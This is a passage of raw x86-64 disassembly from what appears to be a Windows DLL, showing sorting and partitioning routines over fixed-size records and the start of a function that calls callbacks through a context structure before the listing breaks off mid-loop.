   180003b4f:	4a 63 84 00 08 01 00 	movslq 0x108(%rax,%r8,1),%rax
   180003b56:	00 
   180003b57:	48 c1 e2 20          	shl    $0x20,%rdx
   180003b5b:	48 0b d0             	or     %rax,%rdx
   180003b5e:	4a 63 84 07 08 01 00 	movslq 0x108(%rdi,%r8,1),%rax
   180003b65:	00 
   180003b66:	48 0b c8             	or     %rax,%rcx
   180003b69:	48 3b d1             	cmp    %rcx,%rdx
   180003b6c:	73 1b                	jae    0x180003b89
   180003b6e:	49 8d 41 ff          	lea    -0x1(%r9),%rax
   180003b72:	46 89 14 9b          	mov    %r10d,(%rbx,%r11,4)
   180003b76:	4d 8b d9             	mov    %r9,%r11
   180003b79:	48 99                	cqto
   180003b7b:	48 2b c2             	sub    %rdx,%rax
   180003b7e:	48 d1 f8             	sar    $1,%rax
   180003b81:	4c 8b c8             	mov    %rax,%r9
   180003b84:	4d 85 db             	test   %r11,%r11
   180003b87:	7f a7                	jg     0x180003b30
   180003b89:	48 8b 7c 24 18       	mov    0x18(%rsp),%rdi
   180003b8e:	42 89 34 9b          	mov    %esi,(%rbx,%r11,4)
   180003b92:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   180003b97:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
   180003b9c:	c3                   	ret
   180003b9d:	cc                   	int3
   180003b9e:	cc                   	int3
   180003b9f:	cc                   	int3
   180003ba0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003ba5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180003baa:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180003baf:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180003bb4:	57                   	push   %rdi
   180003bb5:	48 83 ec 40          	sub    $0x40,%rsp
   180003bb9:	49 8b c1             	mov    %r9,%rax
   180003bbc:	4c 8b ca             	mov    %rdx,%r9
   180003bbf:	49 8b f0             	mov    %r8,%rsi
   180003bc2:	4c 2b c9             	sub    %rcx,%r9
   180003bc5:	48 8b da             	mov    %rdx,%rbx
   180003bc8:	48 8b f9             	mov    %rcx,%rdi
   180003bcb:	49 c1 f9 02          	sar    $0x2,%r9
   180003bcf:	49 83 f9 20          	cmp    $0x20,%r9
   180003bd3:	0f 8e 9d 00 00 00    	jle    0x180003c76
   180003bd9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180003be0:	48 85 f6             	test   %rsi,%rsi
   180003be3:	0f 8e b9 00 00 00    	jle    0x180003ca2
   180003be9:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180003bee:	4c 8b c8             	mov    %rax,%r9
   180003bf1:	4c 8b c3             	mov    %rbx,%r8
   180003bf4:	48 8b d7             	mov    %rdi,%rdx
   180003bf7:	e8 64 01 00 00       	call   0x180003d60
   180003bfc:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180003c01:	4c 8b 4c 24 68       	mov    0x68(%rsp),%r9
   180003c06:	48 8b c6             	mov    %rsi,%rax
   180003c09:	48 8b cb             	mov    %rbx,%rcx
   180003c0c:	48 99                	cqto
   180003c0e:	48 2b cd             	sub    %rbp,%rcx
   180003c11:	48 2b c2             	sub    %rdx,%rax
   180003c14:	48 83 e1 fc          	and    $0xfffffffffffffffc,%rcx
   180003c18:	48 d1 f8             	sar    $1,%rax
   180003c1b:	48 8b f0             	mov    %rax,%rsi
   180003c1e:	48 99                	cqto
   180003c20:	48 2b c2             	sub    %rdx,%rax
   180003c23:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
   180003c28:	48 d1 f8             	sar    $1,%rax
   180003c2b:	48 03 f0             	add    %rax,%rsi
   180003c2e:	48 8b c2             	mov    %rdx,%rax
   180003c31:	48 2b c7             	sub    %rdi,%rax
   180003c34:	4c 8b c6             	mov    %rsi,%r8
   180003c37:	48 83 e0 fc          	and    $0xfffffffffffffffc,%rax
   180003c3b:	48 3b c1             	cmp    %rcx,%rax
   180003c3e:	7d 0d                	jge    0x180003c4d
   180003c40:	48 8b cf             	mov    %rdi,%rcx
   180003c43:	e8 58 ff ff ff       	call   0x180003ba0
   180003c48:	48 8b fd             	mov    %rbp,%rdi
   180003c4b:	eb 10                	jmp    0x180003c5d
   180003c4d:	48 8b d3             	mov    %rbx,%rdx
   180003c50:	48 8b cd             	mov    %rbp,%rcx
   180003c53:	e8 48 ff ff ff       	call   0x180003ba0
   180003c58:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180003c5d:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   180003c62:	4c 8b cb             	mov    %rbx,%r9
   180003c65:	4c 2b cf             	sub    %rdi,%r9
   180003c68:	49 c1 f9 02          	sar    $0x2,%r9
   180003c6c:	49 83 f9 20          	cmp    $0x20,%r9
   180003c70:	0f 8f 6a ff ff ff    	jg     0x180003be0
   180003c76:	49 83 f9 01          	cmp    $0x1,%r9
   180003c7a:	7e 11                	jle    0x180003c8d
   180003c7c:	45 33 c9             	xor    %r9d,%r9d
   180003c7f:	4c 8b c0             	mov    %rax,%r8
   180003c82:	48 8b d3             	mov    %rbx,%rdx
   180003c85:	48 8b cf             	mov    %rdi,%rcx
   180003c88:	e8 c3 f8 ff ff       	call   0x180003550
   180003c8d:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180003c92:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   180003c97:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   180003c9c:	48 83 c4 40          	add    $0x40,%rsp
   180003ca0:	5f                   	pop    %rdi
   180003ca1:	c3                   	ret
   180003ca2:	49 83 f9 20          	cmp    $0x20,%r9
   180003ca6:	7e ce                	jle    0x180003c76
   180003ca8:	48 8b cb             	mov    %rbx,%rcx
   180003cab:	48 2b cf             	sub    %rdi,%rcx
   180003cae:	48 83 e1 fc          	and    $0xfffffffffffffffc,%rcx
   180003cb2:	48 83 f9 04          	cmp    $0x4,%rcx
   180003cb6:	7e 1f                	jle    0x180003cd7
   180003cb8:	45 33 c9             	xor    %r9d,%r9d
   180003cbb:	4c 8b c0             	mov    %rax,%r8
   180003cbe:	48 8b d3             	mov    %rbx,%rdx
   180003cc1:	48 8b cf             	mov    %rdi,%rcx
   180003cc4:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   180003ccb:	00 00 
   180003ccd:	e8 0e fa ff ff       	call   0x1800036e0
   180003cd2:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   180003cd7:	4c 8b c0             	mov    %rax,%r8
   180003cda:	48 8b d3             	mov    %rbx,%rdx
   180003cdd:	48 8b cf             	mov    %rdi,%rcx
   180003ce0:	e8 0b 00 00 00       	call   0x180003cf0
   180003ce5:	eb a6                	jmp    0x180003c8d
   180003ce7:	cc                   	int3
   180003ce8:	cc                   	int3
   180003ce9:	cc                   	int3
   180003cea:	cc                   	int3
   180003ceb:	cc                   	int3
   180003cec:	cc                   	int3
   180003ced:	cc                   	int3
   180003cee:	cc                   	int3
   180003cef:	cc                   	int3
   180003cf0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180003cf5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   180003cfa:	57                   	push   %rdi
   180003cfb:	48 83 ec 20          	sub    $0x20,%rsp
   180003cff:	48 8b c2             	mov    %rdx,%rax
   180003d02:	49 8b d8             	mov    %r8,%rbx
   180003d05:	48 8b fa             	mov    %rdx,%rdi
   180003d08:	48 2b c1             	sub    %rcx,%rax
   180003d0b:	48 8b e9             	mov    %rcx,%rbp
   180003d0e:	48 83 e0 fc          	and    $0xfffffffffffffffc,%rax
   180003d12:	48 83 f8 04          	cmp    $0x4,%rax
   180003d16:	7e 33                	jle    0x180003d4b
   180003d18:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   180003d1d:	48 8b f1             	mov    %rcx,%rsi
   180003d20:	48 f7 de             	neg    %rsi
   180003d23:	45 33 c9             	xor    %r9d,%r9d
   180003d26:	4c 8b c3             	mov    %rbx,%r8
   180003d29:	48 8b d7             	mov    %rdi,%rdx
   180003d2c:	48 8b cd             	mov    %rbp,%rcx
   180003d2f:	e8 2c fd ff ff       	call   0x180003a60
   180003d34:	48 83 ef 04          	sub    $0x4,%rdi
   180003d38:	48 8d 04 3e          	lea    (%rsi,%rdi,1),%rax
   180003d3c:	48 83 e0 fc          	and    $0xfffffffffffffffc,%rax
   180003d40:	48 83 f8 04          	cmp    $0x4,%rax
   180003d44:	7f dd                	jg     0x180003d23
   180003d46:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   180003d4b:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   180003d50:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   180003d55:	48 83 c4 20          	add    $0x20,%rsp
   180003d59:	5f                   	pop    %rdi
   180003d5a:	c3                   	ret
   180003d5b:	cc                   	int3
   180003d5c:	cc                   	int3
   180003d5d:	cc                   	int3
   180003d5e:	cc                   	int3
   180003d5f:	cc                   	int3
   180003d60:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003d65:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180003d6a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180003d6f:	57                   	push   %rdi
   180003d70:	41 54                	push   %r12
   180003d72:	41 55                	push   %r13
   180003d74:	41 56                	push   %r14
   180003d76:	41 57                	push   %r15
   180003d78:	48 83 ec 20          	sub    $0x20,%rsp
   180003d7c:	4c 8b e2             	mov    %rdx,%r12
   180003d7f:	49 8b c0             	mov    %r8,%rax
   180003d82:	4d 8b f8             	mov    %r8,%r15
   180003d85:	48 2b c2             	sub    %rdx,%rax
   180003d88:	4c 8b e9             	mov    %rcx,%r13
   180003d8b:	49 83 c0 fc          	add    $0xfffffffffffffffc,%r8
   180003d8f:	48 c1 f8 02          	sar    $0x2,%rax
   180003d93:	49 8b cc             	mov    %r12,%rcx
   180003d96:	49 8b d9             	mov    %r9,%rbx
   180003d99:	48 99                	cqto
   180003d9b:	48 2b c2             	sub    %rdx,%rax
   180003d9e:	48 d1 f8             	sar    $1,%rax
   180003da1:	49 8d 3c 84          	lea    (%r12,%rax,4),%rdi
   180003da5:	48 8b d7             	mov    %rdi,%rdx
   180003da8:	e8 d3 fb ff ff       	call   0x180003980
   180003dad:	4c 8d 57 04          	lea    0x4(%rdi),%r10
   180003db1:	4c 3b e7             	cmp    %rdi,%r12
   180003db4:	0f 83 8f 00 00 00    	jae    0x180003e49
   180003dba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180003dc0:	48 63 47 fc          	movslq -0x4(%rdi),%rax
   180003dc4:	4c 8d 5f fc          	lea    -0x4(%rdi),%r11
   180003dc8:	4c 69 c8 24 06 00 00 	imul   $0x624,%rax,%r9
   180003dcf:	48 63 07             	movslq (%rdi),%rax
   180003dd2:	4c 03 cb             	add    %rbx,%r9
   180003dd5:	4c 69 c0 24 06 00 00 	imul   $0x624,%rax,%r8
   180003ddc:	49 63 89 0c 01 00 00 	movslq 0x10c(%r9),%rcx
   180003de3:	4c 03 c3             	add    %rbx,%r8
   180003de6:	48 c1 e1 20          	shl    $0x20,%rcx
   180003dea:	49 63 80 08 01 00 00 	movslq 0x108(%r8),%rax
   180003df1:	49 63 90 0c 01 00 00 	movslq 0x10c(%r8),%rdx
   180003df8:	48 c1 e2 20          	shl    $0x20,%rdx
   180003dfc:	48 0b d0             	or     %rax,%rdx
   180003dff:	49 63 81 08 01 00 00 	movslq 0x108(%r9),%rax
   180003e06:	48 0b c8             	or     %rax,%rcx
   180003e09:	48 3b ca             	cmp    %rdx,%rcx
   180003e0c:	72 3b                	jb     0x180003e49
   180003e0e:	49 63 81 08 01 00 00 	movslq 0x108(%r9),%rax
   180003e15:	49 63 91 0c 01 00 00 	movslq 0x10c(%r9),%rdx
   180003e1c:	49 63 88 0c 01 00 00 	movslq 0x10c(%r8),%rcx
   180003e23:	48 c1 e2 20          	shl    $0x20,%rdx
   180003e27:	48 c1 e1 20          	shl    $0x20,%rcx
   180003e2b:	48 0b d0             	or     %rax,%rdx
   180003e2e:	49 63 80 08 01 00 00 	movslq 0x108(%r8),%rax
   180003e35:	48 0b c8             	or     %rax,%rcx
   180003e38:	48 3b ca             	cmp    %rdx,%rcx
   180003e3b:	72 0c                	jb     0x180003e49
   180003e3d:	49 8b fb             	mov    %r11,%rdi
   180003e40:	4d 3b e3             	cmp    %r11,%r12
   180003e43:	0f 82 77 ff ff ff    	jb     0x180003dc0
   180003e49:	4d 3b d7             	cmp    %r15,%r10
   180003e4c:	0f 83 82 00 00 00    	jae    0x180003ed4
   180003e52:	48 63 07             	movslq (%rdi),%rax
   180003e55:	4c 69 c8 24 06 00 00 	imul   $0x624,%rax,%r9
   180003e5c:	4c 03 cb             	add    %rbx,%r9
   180003e5f:	90                   	nop
   180003e60:	49 63 02             	movslq (%r10),%rax
   180003e63:	49 63 91 0c 01 00 00 	movslq 0x10c(%r9),%rdx
   180003e6a:	48 c1 e2 20          	shl    $0x20,%rdx
   180003e6e:	4c 69 c0 24 06 00 00 	imul   $0x624,%rax,%r8
   180003e75:	49 63 81 08 01 00 00 	movslq 0x108(%r9),%rax
   180003e7c:	4c 03 c3             	add    %rbx,%r8
   180003e7f:	49 63 88 0c 01 00 00 	movslq 0x10c(%r8),%rcx
   180003e86:	48 0b d0             	or     %rax,%rdx
   180003e89:	49 63 80 08 01 00 00 	movslq 0x108(%r8),%rax
   180003e90:	48 c1 e1 20          	shl    $0x20,%rcx
   180003e94:	48 0b c8             	or     %rax,%rcx
   180003e97:	48 3b ca             	cmp    %rdx,%rcx
   180003e9a:	72 38                	jb     0x180003ed4
   180003e9c:	49 63 80 08 01 00 00 	movslq 0x108(%r8),%rax
   180003ea3:	49 63 90 0c 01 00 00 	movslq 0x10c(%r8),%rdx
   180003eaa:	49 63 89 0c 01 00 00 	movslq 0x10c(%r9),%rcx
   180003eb1:	48 c1 e2 20          	shl    $0x20,%rdx
   180003eb5:	48 c1 e1 20          	shl    $0x20,%rcx
   180003eb9:	48 0b d0             	or     %rax,%rdx
   180003ebc:	49 63 81 08 01 00 00 	movslq 0x108(%r9),%rax
   180003ec3:	48 0b c8             	or     %rax,%rcx
   180003ec6:	48 3b ca             	cmp    %rdx,%rcx
   180003ec9:	72 09                	jb     0x180003ed4
   180003ecb:	49 83 c2 04          	add    $0x4,%r10
   180003ecf:	4d 3b d7             	cmp    %r15,%r10
   180003ed2:	72 8c                	jb     0x180003e60
   180003ed4:	4d 8b ca             	mov    %r10,%r9
   180003ed7:	4c 8b df             	mov    %rdi,%r11
   180003eda:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180003ee0:	4d 3b cf             	cmp    %r15,%r9
   180003ee3:	0f 83 a3 00 00 00    	jae    0x180003f8c
   180003ee9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180003ef0:	48 63 07             	movslq (%rdi),%rax
   180003ef3:	49 63 29             	movslq (%r9),%rbp
   180003ef6:	48 69 f0 24 06 00 00 	imul   $0x624,%rax,%rsi
   180003efd:	4c 69 c5 24 06 00 00 	imul   $0x624,%rbp,%r8
   180003f04:	4c 03 c3             	add    %rbx,%r8
   180003f07:	48 03 f3             	add    %rbx,%rsi
   180003f0a:	49 63 80 08 01 00 00 	movslq 0x108(%r8),%rax
   180003f11:	49 63 90 0c 01 00 00 	movslq 0x10c(%r8),%rdx
   180003f18:	48 63 8e 0c 01 00 00 	movslq 0x10c(%rsi),%rcx
   180003f1f:	48 c1 e2 20          	shl    $0x20,%rdx
   180003f23:	48 c1 e1 20          	shl    $0x20,%rcx
   180003f27:	48 0b d0             	or     %rax,%rdx
   180003f2a:	48 63 86 08 01 00 00 	movslq 0x108(%rsi),%rax
   180003f31:	48 0b c8             	or     %rax,%rcx
   180003f34:	48 3b ca             	cmp    %rdx,%rcx
   180003f37:	72 46                	jb     0x180003f7f
   180003f39:	48 63 86 08 01 00 00 	movslq 0x108(%rsi),%rax
   180003f40:	48 63 96 0c 01 00 00 	movslq 0x10c(%rsi),%rdx
   180003f47:	49 63 88 0c 01 00 00 	movslq 0x10c(%r8),%rcx
   180003f4e:	48 c1 e2 20          	shl    $0x20,%rdx
   180003f52:	48 c1 e1 20          	shl    $0x20,%rcx
   180003f56:	48 0b d0             	or     %rax,%rdx
   180003f59:	49 63 80 08 01 00 00 	movslq 0x108(%r8),%rax
   180003f60:	48 0b c8             	or     %rax,%rcx
   180003f63:	48 3b ca             	cmp    %rdx,%rcx
   180003f66:	72 24                	jb     0x180003f8c
   180003f68:	49 8b c2             	mov    %r10,%rax
   180003f6b:	49 83 c2 04          	add    $0x4,%r10
   180003f6f:	49 3b c1             	cmp    %r9,%rax
   180003f72:	74 0b                	je     0x180003f7f
   180003f74:	41 8b 42 fc          	mov    -0x4(%r10),%eax
   180003f78:	41 89 6a fc          	mov    %ebp,-0x4(%r10)
   180003f7c:	41 89 01             	mov    %eax,(%r9)
   180003f7f:	49 83 c1 04          	add    $0x4,%r9
   180003f83:	4d 3b cf             	cmp    %r15,%r9
   180003f86:	0f 82 64 ff ff ff    	jb     0x180003ef0
   180003f8c:	4d 3b dc             	cmp    %r12,%r11
   180003f8f:	0f 86 a8 00 00 00    	jbe    0x18000403d
   180003f95:	4d 8d 43 fc          	lea    -0x4(%r11),%r8
   180003f99:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180003fa0:	48 63 07             	movslq (%rdi),%rax
   180003fa3:	4d 63 30             	movslq (%r8),%r14
   180003fa6:	48 69 f0 24 06 00 00 	imul   $0x624,%rax,%rsi
   180003fad:	49 69 ee 24 06 00 00 	imul   $0x624,%r14,%rbp
   180003fb4:	48 03 f3             	add    %rbx,%rsi
   180003fb7:	48 03 eb             	add    %rbx,%rbp
   180003fba:	48 63 86 08 01 00 00 	movslq 0x108(%rsi),%rax
   180003fc1:	48 63 96 0c 01 00 00 	movslq 0x10c(%rsi),%rdx
   180003fc8:	48 63 8d 0c 01 00 00 	movslq 0x10c(%rbp),%rcx
   180003fcf:	48 c1 e2 20          	shl    $0x20,%rdx
   180003fd3:	48 c1 e1 20          	shl    $0x20,%rcx
   180003fd7:	48 0b d0             	or     %rax,%rdx
   180003fda:	48 63 85 08 01 00 00 	movslq 0x108(%rbp),%rax
   180003fe1:	48 0b c8             	or     %rax,%rcx
   180003fe4:	48 3b ca             	cmp    %rdx,%rcx
   180003fe7:	72 40                	jb     0x180004029
   180003fe9:	48 63 85 08 01 00 00 	movslq 0x108(%rbp),%rax
   180003ff0:	48 63 95 0c 01 00 00 	movslq 0x10c(%rbp),%rdx
   180003ff7:	48 63 8e 0c 01 00 00 	movslq 0x10c(%rsi),%rcx
   180003ffe:	48 c1 e2 20          	shl    $0x20,%rdx
   180004002:	48 c1 e1 20          	shl    $0x20,%rcx
   180004006:	48 0b d0             	or     %rax,%rdx
   180004009:	48 63 86 08 01 00 00 	movslq 0x108(%rsi),%rax
   180004010:	48 0b c8             	or     %rax,%rcx
   180004013:	48 3b ca             	cmp    %rdx,%rcx
   180004016:	72 22                	jb     0x18000403a
   180004018:	48 83 ef 04          	sub    $0x4,%rdi
   18000401c:	49 3b f8             	cmp    %r8,%rdi
   18000401f:	74 08                	je     0x180004029
   180004021:	8b 07                	mov    (%rdi),%eax
   180004023:	44 89 37             	mov    %r14d,(%rdi)
   180004026:	41 89 00             	mov    %eax,(%r8)
   180004029:	49 83 eb 04          	sub    $0x4,%r11
   18000402d:	49 83 e8 04          	sub    $0x4,%r8
   180004031:	4d 3b e3             	cmp    %r11,%r12
   180004034:	0f 82 66 ff ff ff    	jb     0x180003fa0
   18000403a:	4d 3b dc             	cmp    %r12,%r11
   18000403d:	75 35                	jne    0x180004074
   18000403f:	4d 3b cf             	cmp    %r15,%r9
   180004042:	74 76                	je     0x1800040ba
   180004044:	4d 3b d1             	cmp    %r9,%r10
   180004047:	74 0a                	je     0x180004053
   180004049:	41 8b 02             	mov    (%r10),%eax
   18000404c:	8b 0f                	mov    (%rdi),%ecx
   18000404e:	89 07                	mov    %eax,(%rdi)
   180004050:	41 89 0a             	mov    %ecx,(%r10)
   180004053:	4d 8b c1             	mov    %r9,%r8
   180004056:	48 8b d7             	mov    %rdi,%rdx
   180004059:	49 83 c2 04          	add    $0x4,%r10
   18000405d:	41 8b 00             	mov    (%r8),%eax
   180004060:	8b 0a                	mov    (%rdx),%ecx
   180004062:	48 83 c7 04          	add    $0x4,%rdi
   180004066:	89 02                	mov    %eax,(%rdx)
   180004068:	41 89 08             	mov    %ecx,(%r8)
   18000406b:	49 83 c1 04          	add    $0x4,%r9
   18000406f:	e9 6c fe ff ff       	jmp    0x180003ee0
   180004074:	49 83 eb 04          	sub    $0x4,%r11
   180004078:	4d 3b cf             	cmp    %r15,%r9
   18000407b:	75 27                	jne    0x1800040a4
   18000407d:	48 83 ef 04          	sub    $0x4,%rdi
   180004081:	4c 3b df             	cmp    %rdi,%r11
   180004084:	74 0a                	je     0x180004090
   180004086:	8b 07                	mov    (%rdi),%eax
   180004088:	41 8b 0b             	mov    (%r11),%ecx
   18000408b:	41 89 03             	mov    %eax,(%r11)
   18000408e:	89 0f                	mov    %ecx,(%rdi)
   180004090:	41 8b 42 fc          	mov    -0x4(%r10),%eax
   180004094:	8b 0f                	mov    (%rdi),%ecx
   180004096:	49 83 ea 04          	sub    $0x4,%r10
   18000409a:	89 07                	mov    %eax,(%rdi)
   18000409c:	41 89 0a             	mov    %ecx,(%r10)
   18000409f:	e9 3c fe ff ff       	jmp    0x180003ee0
   1800040a4:	41 8b 09             	mov    (%r9),%ecx
   1800040a7:	41 8b 03             	mov    (%r11),%eax
   1800040aa:	49 83 c1 04          	add    $0x4,%r9
   1800040ae:	41 89 41 fc          	mov    %eax,-0x4(%r9)
   1800040b2:	41 89 0b             	mov    %ecx,(%r11)
   1800040b5:	e9 26 fe ff ff       	jmp    0x180003ee0
   1800040ba:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   1800040bf:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   1800040c4:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   1800040c9:	49 89 7d 00          	mov    %rdi,0x0(%r13)
   1800040cd:	4d 89 55 08          	mov    %r10,0x8(%r13)
   1800040d1:	49 8b c5             	mov    %r13,%rax
   1800040d4:	48 83 c4 20          	add    $0x20,%rsp
   1800040d8:	41 5f                	pop    %r15
   1800040da:	41 5e                	pop    %r14
   1800040dc:	41 5d                	pop    %r13
   1800040de:	41 5c                	pop    %r12
   1800040e0:	5f                   	pop    %rdi
   1800040e1:	c3                   	ret
   1800040e2:	cc                   	int3
   1800040e3:	cc                   	int3
   1800040e4:	cc                   	int3
   1800040e5:	cc                   	int3
   1800040e6:	cc                   	int3
   1800040e7:	cc                   	int3
   1800040e8:	cc                   	int3
   1800040e9:	cc                   	int3
   1800040ea:	cc                   	int3
   1800040eb:	cc                   	int3
   1800040ec:	cc                   	int3
   1800040ed:	cc                   	int3
   1800040ee:	cc                   	int3
   1800040ef:	cc                   	int3
   1800040f0:	40 55                	rex push %rbp
   1800040f2:	56                   	push   %rsi
   1800040f3:	57                   	push   %rdi
   1800040f4:	41 54                	push   %r12
   1800040f6:	41 55                	push   %r13
   1800040f8:	41 56                	push   %r14
   1800040fa:	41 57                	push   %r15
   1800040fc:	48 81 ec 30 01 00 00 	sub    $0x130,%rsp
   180004103:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   180004108:	48 89 9d 50 01 00 00 	mov    %rbx,0x150(%rbp)
   18000410f:	48 8b 05 ea 4e 01 00 	mov    0x14eea(%rip),%rax        # 0x180019000
   180004116:	48 33 c5             	xor    %rbp,%rax
   180004119:	48 89 85 f0 00 00 00 	mov    %rax,0xf0(%rbp)
   180004120:	48 63 42 60          	movslq 0x60(%rdx),%rax
   180004124:	4c 8b ea             	mov    %rdx,%r13
   180004127:	4c 8b f1             	mov    %rcx,%r14
   18000412a:	4c 69 f8 24 06 00 00 	imul   $0x624,%rax,%r15
   180004131:	48 8b 41 40          	mov    0x40(%rcx),%rax
   180004135:	4c 03 b9 70 03 00 00 	add    0x370(%rcx),%r15
   18000413c:	48 85 c0             	test   %rax,%rax
   18000413f:	0f 84 14 03 00 00    	je     0x180004459
   180004145:	41 8b 57 04          	mov    0x4(%r15),%edx
   180004149:	33 db                	xor    %ebx,%ebx
   18000414b:	48 8d 4d 04          	lea    0x4(%rbp),%rcx
   18000414f:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   180004154:	49 8b 4e 08          	mov    0x8(%r14),%rcx
   180004158:	4c 8d 4d 08          	lea    0x8(%rbp),%r9
   18000415c:	4c 8d 45 00          	lea    0x0(%rbp),%r8
   180004160:	89 5d 00             	mov    %ebx,0x0(%rbp)
   180004163:	89 5d 08             	mov    %ebx,0x8(%rbp)
   180004166:	89 5d 04             	mov    %ebx,0x4(%rbp)
   180004169:	ff d0                	call   *%rax
   18000416b:	85 c0                	test   %eax,%eax
   18000416d:	0f 85 c5 02 00 00    	jne    0x180004438
   180004173:	39 5d 00             	cmp    %ebx,0x0(%rbp)
   180004176:	0f 84 bc 02 00 00    	je     0x180004438
   18000417c:	8b 45 04             	mov    0x4(%rbp),%eax
   18000417f:	83 f8 07             	cmp    $0x7,%eax
   180004182:	0f 85 82 01 00 00    	jne    0x18000430a
   180004188:	49 8b 7e 58          	mov    0x58(%r14),%rdi
   18000418c:	48 85 ff             	test   %rdi,%rdi
   18000418f:	0f 84 a3 02 00 00    	je     0x180004438
   180004195:	49 39 5e 60          	cmp    %rbx,0x60(%r14)
   180004199:	0f 84 99 02 00 00    	je     0x180004438
   18000419f:	49 39 5e 68          	cmp    %rbx,0x68(%r14)
   1800041a3:	0f 84 8f 02 00 00    	je     0x180004438
   1800041a9:	48 8d 4d 44          	lea    0x44(%rbp),%rcx
   1800041ad:	33 d2                	xor    %edx,%edx
   1800041af:	41 b8 a0 00 00 00    	mov    $0xa0,%r8d
   1800041b5:	89 5d 40             	mov    %ebx,0x40(%rbp)
   1800041b8:	e8 a3 10 00 00       	call   0x180005260
   1800041bd:	41 8b 57 04          	mov    0x4(%r15),%edx
   1800041c1:	49 8b 4e 08          	mov    0x8(%r14),%rcx
   1800041c5:	4c 8d 45 40          	lea    0x40(%rbp),%r8
   1800041c9:	ff d7                	call   *%rdi
   1800041cb:	85 c0                	test   %eax,%eax
   1800041cd:	0f 85 65 02 00 00    	jne    0x180004438
   1800041d3:	8b 45 40             	mov    0x40(%rbp),%eax
   1800041d6:	85 c0                	test   %eax,%eax
   1800041d8:	0f 8e 5a 02 00 00    	jle    0x180004438
   1800041de:	ff c0                	inc    %eax
   1800041e0:	44 8d 24 40          	lea    (%rax,%rax,2),%r12d
   1800041e4:	41 c1 e4 02          	shl    $0x2,%r12d
   1800041e8:	49 63 fc             	movslq %r12d,%rdi
   1800041eb:	48 8d 47 10          	lea    0x10(%rdi),%rax
   1800041ef:	48 3b c7             	cmp    %rdi,%rax
   1800041f2:	76 5b                	jbe    0x18000424f
   1800041f4:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
   1800041f8:	48 81 f9 00 04 00 00 	cmp    $0x400,%rcx
   1800041ff:	77 35                	ja     0x180004236
   180004201:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   180004205:	48 3b c1             	cmp    %rcx,%rax
   180004208:	77 0a                	ja     0x180004214
   18000420a:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   180004211:	ff ff 0f 
   180004214:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   180004218:	e8 73 14 00 00       	call   0x180005690
   18000421d:	48 2b e0             	sub    %rax,%rsp
   180004220:	48 8d 74 24 30       	lea    0x30(%rsp),%rsi
   180004225:	48 85 f6             	test   %rsi,%rsi
   180004228:	74 28                	je     0x180004252
   18000422a:	c7 06 cc cc 00 00    	movl   $0xcccc,(%rsi)
   180004230:	48 83 c6 10          	add    $0x10,%rsi
   180004234:	eb 1c                	jmp    0x180004252
   180004236:	e8 85 13 00 00       	call   0x1800055c0
   18000423b:	48 8b f0             	mov    %rax,%rsi
   18000423e:	48 85 c0             	test   %rax,%rax
   180004241:	74 0f                	je     0x180004252
   180004243:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   180004249:	48 83 c6 10          	add    $0x10,%rsi
   18000424d:	eb 03                	jmp    0x180004252
   18000424f:	48 8b f3             	mov    %rbx,%rsi
   180004252:	4c 8b c7             	mov    %rdi,%r8
   180004255:	33 d2                	xor    %edx,%edx
   180004257:	48 8b ce             	mov    %rsi,%rcx
   18000425a:	e8 01 10 00 00       	call   0x180005260
   18000425f:	44 89 26             	mov    %r12d,(%rsi)
   180004262:	8b 45 40             	mov    0x40(%rbp),%eax
   180004265:	89 46 08             	mov    %eax,0x8(%rsi)
   180004268:	41 8b 57 04          	mov    0x4(%r15),%edx
   18000426c:	49 8b 4e 08          	mov    0x8(%r14),%rcx
   180004270:	4c 8b c6             	mov    %rsi,%r8
   180004273:	8b fb                	mov    %ebx,%edi
   180004275:	41 ff 56 60          	call   *0x60(%r14)
   180004279:	85 c0                	test   %eax,%eax
   18000427b:	75 26                	jne    0x1800042a3
   18000427d:	8b 45 40             	mov    0x40(%rbp),%eax
   180004280:	85 c0                	test   %eax,%eax
   180004282:	7e 1f                	jle    0x1800042a3
   180004284:	48 8d 4e 0c          	lea    0xc(%rsi),%rcx
   180004288:	8b d0                	mov    %eax,%edx
   18000428a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   180004290:	39 59 08             	cmp    %ebx,0x8(%rcx)
